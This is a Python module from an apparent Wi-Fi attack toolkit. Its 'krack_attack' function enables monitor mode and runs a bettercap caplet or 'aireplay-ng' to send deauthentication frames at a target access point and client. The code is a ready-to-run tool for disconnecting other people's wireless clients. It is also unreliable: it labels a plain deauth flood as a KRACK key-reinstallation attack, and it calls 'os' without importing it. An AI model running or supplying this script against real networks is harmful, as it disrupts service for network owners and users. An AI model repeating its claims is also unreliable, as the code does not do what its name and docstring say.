#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import time
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.status import print_status, ProgressDisplay
from utils.process import active_processes, add_process, remove_process, is_cancelled, set_cancel_flag
from utils.logger import log_capture


def krack_attack(bssid: str, client_mac: str = None, channel: str = "1") -> bool:
    """Key Reinstallation Attack using bettercap or manual deauth."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    print_status(f"KRACK attack: {bssid}", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    set_cancel_flag(False)

    # Try bettercap first
    try:
        subprocess.run(["which", "bettercap"], capture_output=True, check=True)
        caplet = f"""
set wifi.interface {mon_iface}
set wifi.ap.bssid {bssid}
wifi.recon on
sleep 2
wifi.deauth {bssid}
sleep 3
wifi.recon off
"""
        caplet_file = f"/tmp/krack_{os.environ.get('SESSION_ID', 'unknown')}.cap"
        with open(caplet_file, 'w') as f:
            f.write(caplet)
        proc = subprocess.Popen(["bettercap", "-eval", caplet, "-caplet", caplet_file],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        add_process(proc)
        print_status("KRACK attack running (bettercap)", "info")
        for i in range(45):
            if is_cancelled():
                proc.terminate()
                remove_process(proc)
                return False
            time.sleep(1)
        proc.terminate()
        remove_process(proc)
    except:
        print_status("Bettercap not available, using manual method", "warning")
        deauth_cmd = ["aireplay-ng", "-0", "20", "-a", bssid]
        if client_mac:
            deauth_cmd.extend(["-c", client_mac])
        deauth_cmd.append(mon_iface)
        proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        add_process(proc)
        for i in range(30):
            if is_cancelled():
                proc.terminate()
                remove_process(proc)
                return False
            time.sleep(1)
        proc.terminate()
        remove_process(proc)

    log_capture("krack", bssid, "", None)
    print_status("KRACK attack completed", "success")
    return True
